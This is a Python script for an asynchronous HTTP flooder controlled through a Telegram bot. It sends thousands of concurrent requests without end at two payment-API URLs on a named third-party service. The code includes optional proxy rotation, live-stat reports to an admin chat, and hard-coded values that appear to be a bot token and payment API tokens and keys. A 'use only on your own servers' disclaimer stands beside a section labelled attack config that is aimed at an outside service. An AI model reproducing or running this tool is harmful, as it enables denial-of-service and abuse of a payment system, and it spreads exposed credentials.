#!/usr/bin/env python3
"""
Infinite API flooder with Telegram bot control.
Use ONLY on your own servers.
"""
import asyncio
import aiohttp
import random
import string
import time
import logging
import signal
import sys
from telegram import Update, BotCommand
from telegram.ext import Application, CommandHandler, ContextTypes

# ─── TELEGRAM CONFIG ──────────────────────────────────────
BOT_TOKEN = "8711419221:AAGx9Rylji34qJeOShWZk0gQkv9YPZ7fXDo"
ADMIN_ID = 8401097557

# ─── ATTACK CONFIG ────────────────────────────────────────
TARGET_APIS = [
    "https://ultra-pay.in/APIs/api?token=03ImpEdccxeW52fJDa21P8PmeqO5JZ9ih5yOR92oDPHj&key=i8g5tb9OBczYhcAk8vgp&paytoNumber=9359202967&amount=1&comment={comment}",
    "https://ultra-pay.in/APIs/api?token=vlJEudnxirygr2lWDdRRVzNTlovGDOhHWi1Rs8LRoA&key=buTSXj38WxEW9T70y3&paytoNumber=6283146815&amount=1&comment={comment}"
]

CONCURRENT = 5000                # Adjust for speed
TOTAL_REQUESTS = 0              # 0 = infinite
REQUEST_DELAY = 0
USE_PROXIES = False
PROXY_FILE = "proxies.txt"

# ─── STATS ──────────────────────────────────────────────────
stats = {'sent': 0, 'ok': 0, 'fail': 0}
lock = asyncio.Lock()
start_time = time.time()
flooder_running = True
loop = None

# ─── PROXY LOADER ──────────────────────────────────────────
def load_proxies():
    try:
        with open(PROXY_FILE) as f:
            return [line.strip() for line in f if line.strip() and not line.startswith('#')]
    except FileNotFoundError:
        return []

def random_comment(length=8):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def build_url(base):
    return base.format(comment=random_comment())

# ─── ASYNC FLOODER ────────────────────────────────────────
async def fire(session, sem, url, proxy=None):
    global stats
    async with sem:
        try:
            async with session.get(url, proxy=proxy, ssl=False, timeout=5) as resp:
                status = resp.status
            async with lock:
                stats['sent'] += 1
                if 200 <= status < 400:
                    stats['ok'] += 1
                else:
                    stats['fail'] += 1
        except Exception:
            async with lock:
                stats['sent'] += 1
                stats['fail'] += 1

async def flooder_task():
    proxies = load_proxies() if USE_PROXIES else []
    sem = asyncio.Semaphore(CONCURRENT)
    connector = aiohttp.TCPConnector(limit=CONCURRENT * 2, limit_per_host=CONCURRENT, force_close=False)
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = set()
        count = 0
        while flooder_running and (TOTAL_REQUESTS == 0 or count < TOTAL_REQUESTS):
            for base in TARGET_APIS:
                if not flooder_running or (TOTAL_REQUESTS != 0 and count >= TOTAL_REQUESTS):
                    break
                url = build_url(base)
                proxy = random.choice(proxies) if proxies else None
                task = asyncio.create_task(fire(session, sem, url, proxy))
                tasks.add(task)
                count += 1
                # Clean up completed tasks occasionally
                if len(tasks) > CONCURRENT * 2:
                    done, tasks = await asyncio.wait(tasks, timeout=0, return_when=asyncio.FIRST_COMPLETED)
                    tasks = set(tasks)  # keep only pending
                await asyncio.sleep(0)  # yield
        # Wait for remaining tasks to finish (if stopping)
        if tasks:
            await asyncio.wait(tasks, timeout=5)

# ─── TELEGRAM BOT COMMANDS ──────────────────────────────────
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("⛔ Unauthorized.")
        return
    await update.message.reply_text("✅ Flooder is running. Use /status, /stop, /start, /stats")

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    elapsed = time.time() - start_time
    rate = stats['sent'] / elapsed if elapsed > 0 else 0
    msg = (f"📊 **Live Stats**\n"
           f"📤 Sent: {stats['sent']}\n"
           f"✅ OK: {stats['ok']}\n"
           f"❌ Errors: {stats['fail']}\n"
           f"⏱️ Uptime: {int(elapsed)}s\n"
           f"⚡ Rate: {rate:.1f} req/s\n"
           f"🔄 Running: {'Yes' if flooder_running else 'No'}")
    await update.message.reply_text(msg)

async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global flooder_running
    if update.effective_user.id != ADMIN_ID:
        return
    if not flooder_running:
        await update.message.reply_text("⚠️ Already stopped.")
        return
    flooder_running = False
    await update.message.reply_text("🛑 Stopping flooder gracefully...")

async def start_flooder(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global flooder_running, start_time
    if update.effective_user.id != ADMIN_ID:
        return
    if flooder_running:
        await update.message.reply_text("⚠️ Already running.")
        return
    flooder_running = True
    start_time = time.time()
    # Reset stats if needed
    stats['sent'] = 0
    stats['ok'] = 0
    stats['fail'] = 0
    asyncio.create_task(flooder_task())
    await update.message.reply_text("▶️ Flooder started.")

async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # Alias for /status
    await status_command(update, context)

# ─── PERIODIC REPORT ──────────────────────────────────────
async def send_periodic_report(context: ContextTypes.DEFAULT_TYPE):
    if not flooder_running:
        return
    elapsed = time.time() - start_time
    rate = stats['sent'] / elapsed if elapsed > 0 else 0
    msg = (f"📊 **Periodic Report**\n"
           f"📤 Sent: {stats['sent']}\n"
           f"✅ OK: {stats['ok']}\n"
           f"❌ Errors: {stats['fail']}\n"
           f"⚡ Rate: {rate:.1f} req/s")
    await context.bot.send_message(chat_id=ADMIN_ID, text=msg)

# ─── MAIN ──────────────────────────────────────────────────
async def main():
    global loop
    loop = asyncio.get_running_loop()

    # Start the flooder
    asyncio.create_task(flooder_task())

    # Setup Telegram bot
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start_command))
    app.add_handler(CommandHandler("status", status_command))
    app.add_handler(CommandHandler("stop", stop_command))
    app.add_handler(CommandHandler("startflood", start_flooder))
    app.add_handler(CommandHandler("stats", stats_command))

    # Start periodic reports every 30 seconds
    job_queue = app.job_queue
    if job_queue:
        job_queue.run_repeating(send_periodic_report, interval=30, first=10)

    # Send startup message
    await app.bot.send_message(chat_id=ADMIN_ID, text="🔥 Flooder started. Bot online.")

    # Start polling (this runs forever)
    await app.initialize()
    await app.start()
    await app.updater.start_polling()
    # Keep running until interrupted
    try:
        while True:
            await asyncio.sleep(60)
    except asyncio.CancelledError:
        pass
    finally:
        await app.updater.stop()
        await app.stop()

if __name__ == "__main__":
    # Handle graceful shutdown
    def signal_handler(sig, frame):
        global flooder_running
        print("Received interrupt. Stopping flooder...")
        flooder_running = False
        sys.exit(0)
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)

    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("Exiting.")
